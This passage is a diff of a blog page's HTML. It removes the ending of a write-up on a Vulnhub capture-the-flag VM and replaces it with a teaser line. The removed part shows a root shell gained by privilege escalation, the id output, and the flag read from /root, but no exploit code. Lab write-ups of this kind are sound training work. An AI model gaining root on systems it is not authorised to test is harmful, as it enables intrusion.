-<span style="color: white;">creating</span> <span style="color: white;">shared</span> <span style="color: white;">library</span>
-<span style="color: white;">#</span> <span style="color: white;">id</span>
-<span style="color: white;">id</span>
-<span style="color: white;">uid=0(root)</span> <span style="color: white;">gid=0(root)</span> <span style="color: white;">groups=0(root),</span><span style="color: #0086f7; font-weight: bold;">33</span><span style="color: white;">(www-data)</span>
-<span style="color: white;">#</span> 
-</pre>
-</div>
-<br />
-Success! I am now running as root! I navigate to the <i>/root</i> directory and cat the <i>flag.txt</i>:<br />
-<br />
-<!-- HTML generated using hilite.me --><br />
-<div style="background: #111111; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;">
-<pre style="line-height: 125%; margin: 0;"><span style="color: white;">#</span> <span style="color: white;">cd</span> <span style="color: white;">/root</span>
-<span style="color: white;">cd</span> <span style="color: white;">/root</span>
-<span style="color: white;">#</span> <span style="color: white;">ls</span>
-<span style="color: white;">ls</span>
-<span style="color: white;">flag.txt</span>
-<span style="color: white;">#</span> <span style="color: white;">cat</span> <span style="color: white;">flag.txt</span>
-<span style="color: white;">cat</span> <span style="color: white;">flag.txt</span>
-<span style="color: white;">U</span> <span style="color: white;">wyn</span> <span style="color: white;">teh</span> <span style="color: white;">Interwebs!!1eleven11!!1!</span>
-<span style="color: white;">Hack</span> <span style="color: white;">the</span> <span style="color: white;">planet!</span>
-<span style="color: white;">#</span> 
-</pre>
-</div>
-<br />
-This was a great first VM to publish and I enjoyed utilizing 2 vulnerabilities (1 for remote access and the other for privilege escalation).<br />
-<br />
-Thanks Robert Winkel for creating this VM and, thanks Vulnhub for hosting it!
+Thanks For Watching...In Next Post I will reveal the method...:)
 <div style='clear: both;'></div>
 </div>
 <div class='post-footer'>
